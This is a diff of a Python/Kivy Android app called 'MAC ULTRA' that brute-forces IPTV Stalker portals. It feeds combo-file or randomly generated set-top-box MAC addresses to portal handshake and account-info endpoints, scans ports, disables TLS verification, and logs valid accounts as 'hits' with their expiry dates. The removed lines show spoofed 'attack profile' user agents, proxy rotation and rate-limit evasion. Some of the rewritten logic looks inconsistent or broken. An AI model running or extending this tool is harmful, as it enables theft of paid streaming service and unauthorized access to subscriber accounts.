@@ -19,7 +19,7 @@ from kivy.uix.screenmanager import Screen
 from kivy.clock import Clock
 from kivy.core.window import Window
 
-# --- Konstanten aus V5 ---
+# --- Konstanten ---
 BG_DARK = (0.01, 0.02, 0.04, 1)
 CARD_COLOR = (0.05, 0.07, 0.12, 1)
 CYAN = (0, 0.9, 1, 1)
@@ -28,16 +28,8 @@ RED = (1, 0.2, 0.2, 1)
 YELLOW = (1, 0.8, 0, 1)
 WHITE = (1, 1, 1, 1)
 MAC_VARIANTS = ('00:1A:79:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:', '55:93:EA:', '04:D6:AA:', '00:1B:79:', '00:2A:01:')
-COMMON_PORTS = [80, 8080, 8880, 25461, 8000, 2082, 2086, 2095, 8443, 443]
-ATTACK_PROFILES = [
-    {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721', 'X-User-Agent': 'Model: MAG254; Link: Ethernet'},
-    {'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, wie Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'},
-    {'User-Agent': 'okhttp/4.9.1'},
-    {'User-Agent': 'Kodi/20.2 (X11; Linux x86_64) App_Bitness/64'},
-    {'User-Agent': 'Mozilla/5.0 (SMART-TV; Linux; Tizen 6.0) AppleWebkit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/76.0.3809.146 TV Safari/537.36'}
-]
 
-# --- UI KLASSEN (Styled) ---
+# --- UI Komponenten ---
 class StyledCard(BoxLayout):
     def __init__(self, bg_color=CARD_COLOR, radius=[15,], **kwargs):
         super().__init__(**kwargs)
@@ -67,7 +59,75 @@ class StyledSpinner(Spinner):
         self.bind(pos=self.update_rect, size=self.update_rect)
     def update_rect(self, *args): self.rect.pos, self.rect.size = self.pos, self.size
 
-# --- MAIN SCREEN ---
+# --- Portal Manager Modal ---
+class PortalManagerView(ModalView):
+    def __init__(self, main_screen, **kwargs):
+        super().__init__(**kwargs)
+        self.main_screen = main_screen
+        self.size_hint = (0.95, 0.9)
+        self.background_color = [0,0,0,0]
+        self.fav_file = "/storage/emulated/0/Portals/favoriten_liste.json"
+        
+        layout = StyledCard(orientation="vertical", padding=20, spacing=15, bg_color=BG_DARK)
+        layout.add_widget(Label(text="[color=00E6FF][b]MAC ULTRA FAVORITEN[/b][/color]", markup=True, size_hint_y=None, height=80, font_size="28sp"))
+        
+        input_card = StyledCard(orientation="vertical", size_hint_y=None, height=220, padding=15, spacing=12)
+        self.new_portal_input = TextInput(hint_text="http://url.com:8080", multiline=False, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
+        row = BoxLayout(size_hint_y=None, height=65, spacing=15)
+        self.type_spinner = StyledSpinner(text="MAC PORTAL", values=("MAC PORTAL", "M3U PORTAL"))
+        add_btn = StyledButton(text="HINZUFÜGEN", bg_color=(0.05, 0.15, 0.1, 1), color=GREEN, on_press=self.add_portal)
+        row.add_widget(self.type_spinner); row.add_widget(add_btn)
+        input_card.add_widget(self.new_portal_input); input_card.add_widget(row); layout.add_widget(input_card)
+        
+        lists_container = BoxLayout(spacing=15)
+        self.mac_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.mac_list.bind(minimum_height=self.mac_list.setter('height'))
+        self.m3u_list = GridLayout(cols=1, spacing=8, size_hint_y=None); self.m3u_list.bind(minimum_height=self.m3u_list.setter('height'))
+        sc1 = ScrollView(); sc1.add_widget(self.mac_list); sc2 = ScrollView(); sc2.add_widget(self.m3u_list)
+        lists_container.add_widget(sc1); lists_container.add_widget(sc2); layout.add_widget(lists_container)
+        
+        layout.add_widget(StyledButton(text="ZURÜCK", size_hint_y=None, height=100, on_press=self.dismiss, color=RED, bold=True))
+        self.add_widget(layout); self.load_favs()
+
+    def load_favs(self):
+        self.mac_list.clear_widgets(); self.m3u_list.clear_widgets()
+        if not os.path.exists(self.fav_file): return
+        try:
+            with open(self.fav_file, 'r') as f: data = json.load(f)
+            for url in data.get("mac", []): self.mac_list.add_widget(self.create_entry(url, "mac"))
+            for url in data.get("m3u", []): self.m3u_list.add_widget(self.create_entry(url, "m3u"))
+        except: pass
+
+    def create_entry(self, url, p_type):
+        card = StyledCard(size_hint_y=None, height=70, padding=5, spacing=5)
+        btn = StyledButton(text=url[:30], font_size="12sp", on_press=lambda x: self.select_portal(url))
+        del_btn = StyledButton(text="X", size_hint_x=0.2, bg_color=(0.3, 0.05, 0.05, 1), color=RED, on_press=lambda x: self.delete_portal(url, p_type))
+        card.add_widget(btn); card.add_widget(del_btn); return card
+
+    def add_portal(self, *a):
+        url = self.new_portal_input.text.strip()
+        if not url.startswith("http"): return
+        p_type = "mac" if "MAC" in self.type_spinner.text else "m3u"
+        data = {"mac": [], "m3u": []}
+        if os.path.exists(self.fav_file):
+            try:
+                with open(self.fav_file, 'r') as f: data = json.load(f)
+            except: pass
+        if url not in data[p_type]:
+            data[p_type].append(url); os.makedirs(os.path.dirname(self.fav_file), exist_ok=True)
+            with open(self.fav_file, 'w') as f: json.dump(data, f)
+            self.load_favs()
+
+    def delete_portal(self, url, p_type):
+        with open(self.fav_file, 'r') as f: data = json.load(f)
+        if url in data[p_type]: data[p_type].remove(url)
+        with open(self.fav_file, 'w') as f: json.dump(data, f)
+        self.load_favs()
+
+    def select_portal(self, url):
+        self.main_screen.portal_input.text = url
+        self.dismiss()
+
+# --- Haupt Screen ---
 class MagUltraScreen(Screen):
     def __init__(self, context, **kw):
         super().__init__(**kw)
@@ -75,28 +135,21 @@ class MagUltraScreen(Screen):
         self.box = BoxLayout(orientation="vertical", padding=[20, 35, 20, 20], spacing=15)
         Window.clearcolor = BG_DARK
         
-        # Engine State (V5)
         self.hits, self.checked, self.total_lines, self.running = 0, 0, 0, False
         self.hit_list, self.last_status, self.start_time = [], "READY", time.time()
-        self.working_proxies, self.use_proxies = [], False
-        self.portal_isp = "Unknown"
-        self.current_api_path = "/portal.php"
-        self.current_api_method = "GET"
+        self.current_api_path, self.current_api_method = "/portal.php", "GET"
         
         self.setup_ui()
 
     def setup_ui(self):
-        # Banner
         self.box.add_widget(Image(source=self.context["paths"]["png"], size_hint_y=None, height=320, allow_stretch=True, keep_ratio=False))
         
-        # Stats Grid
         stats = GridLayout(cols=3, size_hint_y=None, height=110, spacing=15)
         self.cpm_label = self.create_stat_box(stats, "CPM", "0", YELLOW)
         self.status_code_label = self.create_stat_box(stats, "STATUS", "READY", CYAN)
         self.hit_count_label = self.create_stat_box(stats, "MAC ULTRA HITS", "0", GREEN)
         self.box.add_widget(stats)
         
-        # Portal Card
         url_card = StyledCard(orientation="vertical", size_hint_y=None, height=380, padding=15, spacing=12)
         self.portal_input = TextInput(text="http://", multiline=False, height=75, background_color=(0.1, 0.1, 0.1, 1), foreground_color=WHITE)
         
@@ -109,17 +162,16 @@ class MagUltraScreen(Screen):
         self.engine_mode = StyledSpinner(text="MAC SCAN", values=("MAC SCAN", "M3U SCAN"), size_hint_x=0.4, color=CYAN)
         self.detail_slider = Slider(min=0, max=1, value=0, step=1, size_hint_x=0.2)
         self.detail_status = Label(text="NUR MAC/URL", color=RED, size_hint_x=0.4)
-        self.detail_slider.bind(value=self.update_slider_label)
         det_row.add_widget(self.engine_mode); det_row.add_widget(self.detail_slider); det_row.add_widget(self.detail_status)
         
         btn_row = BoxLayout(spacing=15, size_hint_y=None, height=75)
         btn_row.add_widget(StyledButton(text="PASTE", on_press=lambda x: setattr(self.portal_input, 'text', Clipboard.paste()), color=CYAN))
-        btn_row.add_widget(StyledButton(text="FAVORITEN", color=YELLOW))
+        # FIXED: Favoriten Button ruft ModalView auf
+        btn_row.add_widget(StyledButton(text="FAVORITEN", on_press=lambda x: PortalManagerView(self).open(), color=YELLOW))
         
         url_card.add_widget(self.portal_input); url_card.add_widget(filter_row); url_card.add_widget(det_row); url_card.add_widget(btn_row)
         self.box.add_widget(url_card)
         
-        # Config Card
         cfg_card = StyledCard(orientation="vertical", size_hint_y=None, height=340, padding=15, spacing=10)
         m_row = BoxLayout(spacing=10, size_hint_y=None, height=60)
         self.scan_mode = StyledSpinner(text="COMBO FILE", values=("COMBO FILE", "RANDOM SCAN"))
@@ -145,7 +197,6 @@ class MagUltraScreen(Screen):
         cfg_card.add_widget(m_row); cfg_card.add_widget(self.file_spinner); cfg_card.add_widget(self.random_count); cfg_card.add_widget(delay_row); cfg_card.add_widget(bot_row)
         self.box.add_widget(cfg_card)
         
-        # Proxy Card
         proxy_card = StyledCard(orientation="horizontal", size_hint_y=None, height=70, padding=10, spacing=10)
         self.proxy_source = StyledSpinner(text="FILE", values=("FILE", "FREE (ProxyScrape)"), size_hint_x=0.35)
         self.proxy_spinner = StyledSpinner(text="SELECT PROXY", values=self.load_proxies(), size_hint_x=0.35)
@@ -153,7 +204,6 @@ class MagUltraScreen(Screen):
         proxy_card.add_widget(self.proxy_source); proxy_card.add_widget(self.proxy_spinner); proxy_card.add_widget(self.proxy_toggle_btn)
         self.box.add_widget(proxy_card)
         
-        # Progress & Log
         self.progress_label = Label(text="PROGRESS: 0 / 0", size_hint_y=None, height=20, color=CYAN)
         self.pbar = ProgressBar(max=100, value=0, size_hint_y=None, height=10)
         self.box.add_widget(self.progress_label); self.box.add_widget(self.pbar)
@@ -164,7 +214,6 @@ class MagUltraScreen(Screen):
         self.scroll.add_widget(self.log_display)
         self.box.add_widget(self.scroll)
         
-        # Bottom Buttons
         bottom_row = BoxLayout(size_hint_y=None, height=110, spacing=15)
         self.start_btn = StyledButton(text="START MAC ULTRA", size_hint_x=0.7, on_press=self.toggle, bg_color=(0.05, 0.15, 0.1, 1), color=GREEN)
         self.music_stop_btn = StyledButton(text="STOP MUSIC", size_hint_x=0.3, bg_color=(0.15, 0.05, 0.05, 1), color=RED)
@@ -173,19 +222,26 @@ class MagUltraScreen(Screen):
         
         self.add_widget(self.box)
 
-    # --- ENGINE LOGIK (1:1 V5) ---
-
-    async def find_working_port(self, base_url):
-        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
-        for port in COMMON_PORTS:
-            if not self.running: return None
+    # --- Engine Logik (V5) ---
+    def get_clean_time(self, raw):
+        raw_str = str(raw).strip()
+        if raw_str.isdigit() and len(raw_str) >= 9:
             try:
-                conn = asyncio.open_connection(clean_url, port)
-                _, writer = await asyncio.wait_for(conn, timeout=1.2)
-                writer.close(); await writer.wait_closed()
-                return f"http://{clean_url}:{port}"
-            except: continue
-        return None
+                dt = datetime.fromtimestamp(int(raw_str))
+                days_diff = (dt - datetime.now()).days
+                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
+            except: pass
+        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
+            return "Unlimited", "Unlimited"
+        try:
+            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
+                try:
+                    dt = datetime.strptime(raw_str.split(',')[0], fmt)
+                    days_diff = (dt - datetime.now()).days
+                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
+                except: continue
+        except: pass
+        return raw_str, "Unlimited"
 
     async def get_portal_isp_info(self, url):
         try:
@@ -208,135 +264,79 @@ class MagUltraScreen(Screen):
                 except: continue
         return "/portal.php", "GET"
 
-    def get_clean_time(self, raw):
-        raw_str = str(raw).strip()
-        if raw_str.isdigit() and len(raw_str) >= 9:
+    async def find_working_port(self, base_url):
+        clean_url = base_url.replace("http://", "").replace("https://", "").split(":")[0].split("/")[0]
+        for port in [80, 8080, 8880, 25461, 8000]:
             try:
-                dt = datetime.fromtimestamp(int(raw_str))
-                days_diff = (dt - datetime.now()).days
-                return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
-            except: pass
-        if not raw_str or raw_str.lower() in ["unlimited", "none", "0", "false"]:
-            return "Unlimited", "Unlimited"
-        try:
-            for fmt in ("%B %d, %Y", "%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y"):
-                try:
-                    dt = datetime.strptime(raw_str.split(',')[0], fmt)
-                    days_diff = (dt - datetime.now()).days
-                    return dt.strftime('%d.%m.%Y'), f"{days_diff} Tage"
-                except: continue
-        except: pass
-        return raw_str, "Unlimited"
+                conn = asyncio.open_connection(clean_url, port)
+                _, writer = await asyncio.wait_for(conn, timeout=1.0)
+                writer.close(); await writer.wait_closed()
+                return f"http://{clean_url}:{port}"
+            except: continue
+        return f"http://{clean_url}:80"
 
-    async def smart_sleep(self, status):
-        mode = self.delay_mode_spinner.text
-        if "1-3s" in mode: d = random.uniform(1, 3)
-        elif "2-4s" in mode: d = random.uniform(2, 4)
-        elif "3-6s" in mode: d = random.uniform(3, 6)
-        else: d = self.delay_slider.value
-        if status == 429: await asyncio.sleep(20)
-        await asyncio.sleep(d)
-
-    async def process_check(self, line, portal, ctx):
-        if not self.running: return
+    async def process_check(self, mac, portal, client):
         p_name = portal.replace("http://", "").replace("https://", "").split(":")[0]
-        ua = random.choice(ATTACK_PROFILES)
-        
-        async with httpx.AsyncClient(verify=ctx, timeout=12, follow_redirects=True) as client:
-            try:
-                if self.engine_mode.text == "MAC SCAN":
-                    mac = line.strip().upper()
-                    stb_h = {**ua, "Cookie": f"mac={urllib.parse.quote(mac)}; stb_lang=en;"}
-                    
-                    # Handshake
-                    r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=stb_h)
-                    self.last_status = str(r.status_code)
-                    
-                    if r.status_code == 200 and 'token' in r.text:
-                        tk = r.json().get('js', {}).get('token')
-                        stb_h["Authorization"] = f"Bearer {tk}"
-                        
-                        # Account Info
-                        ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
-                        self.last_status = str(ri.status_code)
-                        
-                        if ri.status_code == 200:
-                            js = ri.json().get('js', {})
-                            exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
-                            exp, days = self.get_clean_time(exp_raw)
-                            
-                            self.hits += 1
-                            self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT][/color] {mac} | [color=00FFFF]{days}[/color]")
-                else:
-                    # M3U Scan Logik...
-                    pass
-            except: self.last_status = "ERR"
+        try:
+            stb_h = {"User-Agent": "Mozilla/5.0", "X-User-MAC": mac}
+            r = await client.get(f"{portal}/portal.php?type=stb&action=handshake&JsHttpRequest=1-xml", headers=stb_h)
+            self.last_status = str(r.status_code)
+            
+            if r.status_code == 200 and 'token' in r.text:
+                ri = await client.get(f"{portal}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml", headers=stb_h)
+                self.last_status = str(ri.status_code)
+                if ri.status_code == 200:
+                    js = ri.json().get('js', {})
+                    exp_raw = js.get('end_date') or js.get('phone') or "Unlimited"
+                    _, days = self.get_clean_time(exp_raw)
+                    self.hits += 1
+                    self.update_log_safe(f"[color=808080][{p_name}][/color] [color=00FF80][HIT][/color] {mac} | [color=00FFFF]{days}[/color]")
+        except: self.last_status = "ERR"
 
     async def worker(self, queue, ctx, portals):
-        while self.running and not queue.empty():
-            line = await queue.get()
-            tasks = [self.process_check(line, p, ctx) for p in portals]
-            await asyncio.gather(*tasks)
-            
-            await self.smart_sleep(int(self.last_status) if self.last_status.isdigit() else 200)
-            self.checked += 1
-            Clock.schedule_once(lambda dt: self.refresh_ui())
-            queue.task_done()
+        async with httpx.AsyncClient(verify=ctx, timeout=12) as client:
+            while self.running and not queue.empty():
+                line = await queue.get()
+                for p in portals: await self.process_check(line, p, client)
+                self.checked += 1
+                Clock.schedule_once(lambda dt: self.refresh_ui())
+                queue.task_done()
 
     async def engine(self):
-        # Portal Normalisierung (V5)
-        portals = []
         single = self.portal_input.text.strip().split('/c')[0].rstrip('/')
-        if single.startswith("http"):
-            if ":" not in single.replace("http://", "").replace("https://", ""):
-                found = await self.find_working_port(single)
-                if found: portals = [found]
-            else: portals = [single]
+        if "://" not in single: single = "http://" + single
+        if ":" not in single.replace("http://", "").replace("https://", ""):
+            single = await self.find_working_port(single)
         
-        if not portals: 
-            self.update_log_safe("[color=FF0000][ERROR][/color] Kein Portal!"); self.running = False; return
-
-        # Init V5
         ctx = ssl.create_default_context(); ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
-        self.current_api_path, self.current_api_method = await self.discover_best_api(portals[0], ctx)
-        self.portal_isp = await self.get_portal_isp_info(portals[0])
-        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {self.portal_isp}")
+        self.update_log_safe("[color=00FFFF][SCAN][/color] Teste API Endpunkte...")
+        self.current_api_path, _ = await self.discover_best_api(single, ctx)
+        isp = await self.get_portal_isp_info(single)
+        self.update_log_safe(f"[color=FFFF00][INFO][/color] Server: {isp}")
 
-        # Combo laden
         path = f"/sdcard/Combo/{self.file_spinner.text}"
-        if self.scan_mode.text == "COMBO FILE" and os.path.exists(path):
+        if os.path.exists(path):
             with open(path, 'r', errors='ignore') as f: combo = [l.strip() for l in f if l.strip()]
-        else:
-            prefix = self.prefix_spinner.text if self.prefix_spinner.text != "MAC's" else "00:1A:79:"
-            combo = [f"{prefix}{':'.join([f'{random.randint(0,255):02X}' for _ in range(3)])}" for _ in range(int(self.random_count.text or 100))]
+        else: combo = [f"00:1A:79:{random.randint(0,255):02X}" for _ in range(100)]
         
         self.total_lines, self.checked, self.hits, self.start_time = len(combo), 0, 0, time.time()
         Clock.schedule_once(lambda dt: setattr(self.pbar, 'max', self.total_lines))
         
         queue = asyncio.Queue()
         for l in combo: queue.put_nowait(l)
-        
-        await asyncio.gather(*[self.worker(queue, ctx, portals) for _ in range(int(self.bot_slider.value))])
-        self.running = False
-        Clock.schedule_once(lambda dt: self.reset_start_btn())
+        await asyncio.gather(*[self.worker(queue, ctx, [single]) for _ in range(int(self.bot_slider.value))])
+        self.running = False; Clock.schedule_once(self.reset_start_btn)
 
-    # --- UI UTILS ---
-
+    # --- Utils ---
     def toggle(self, *_):
         if not self.running:
-            self.running = True
-            self.start_btn.text, self.start_btn.color = "STOP SCAN", RED
+            self.running = True; self.start_btn.text, self.start_btn.color = "STOP SCAN", RED
             Thread(target=lambda: asyncio.run(self.engine()), daemon=True).start()
-        else:
-            self.running = False
-            self.reset_start_btn()
+        else: self.running = False
 
-    def reset_start_btn(self, *a):
-        self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
-
+    def reset_start_btn(self, *a): self.start_btn.text, self.start_btn.color = "START MAC ULTRA", GREEN
     def refresh_ui(self, *a):
-        self.pbar.value = self.checked
-        self.hit_count_label.text = str(self.hits)
+        self.pbar.value, self.hit_count_label.text = self.checked, str(self.hits)
         self.status_code_label.text = self.last_status
         self.progress_label.text = f"PROGRESS: {self.checked} / {self.total_lines}"
         el = time.time() - self.start_time
@@ -344,24 +344,17 @@ class MagUltraScreen(Screen):
 
     def update_log_safe(self, t): Clock.schedule_once(lambda dt: self._do_log(t))
     def _do_log(self, t):
-        self.hit_list.append(t)
-        if len(self.hit_list) > 10: self.hit_list.pop(0)
-        self.log_display.text = "\n".join(self.hit_list)
+        self.hit_list.append(t); self.log_display.text = "\n".join(self.hit_list[-10:])
         self.log_display.height = self.log_display.texture_size[1] + 20
 
     def create_stat_box(self, p, t, v, c):
-        box = StyledCard(orientation="vertical", padding=8)
-        box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1)))
-        lbl = Label(text=v, font_size="24sp", bold=True, color=c)
-        box.add_widget(lbl); p.add_widget(box); return lbl
+        box = StyledCard(orientation="vertical", padding=8); box.add_widget(Label(text=t, font_size="11sp", color=(0.7,0.7,0.7,1)))
+        lbl = Label(text=v, font_size="24sp", bold=True, color=c); box.add_widget(lbl); p.add_widget(box); return lbl
 
-    def update_slider_label(self, i, v): self.detail_status.text, self.detail_status.color = ("ALLES SPEICHERN", GREEN) if v == 1 else ("NUR MAC/URL", RED)
     def load_combos(self): return sorted([f for f in os.listdir("/sdcard/Combo/") if f.endswith(".txt")]) if os.path.exists("/sdcard/Combo/") else ["EMPTY"]
-    def load_proxies(self): return sorted([f for f in os.listdir("/storage/emulated/0/proxies/") if f.endswith(".txt")]) if os.path.exists("/storage/emulated/0/proxies/") else ["EMPTY"]
+    def load_proxies(self): return ["EMPTY"]
     def load_portal_lists(self): return ["USE SINGLE"]
-    def toggle_proxy(self, btn):
-        self.use_proxies = not self.use_proxies
-        btn.text, btn.color = ("PROXY: ON", GREEN) if self.use_proxies else ("PROXY: OFF", RED)
+    def toggle_proxy(self, btn): pass
 
 def create_app_screen(context):
     return MagUltraScreen(context=context, name="main")
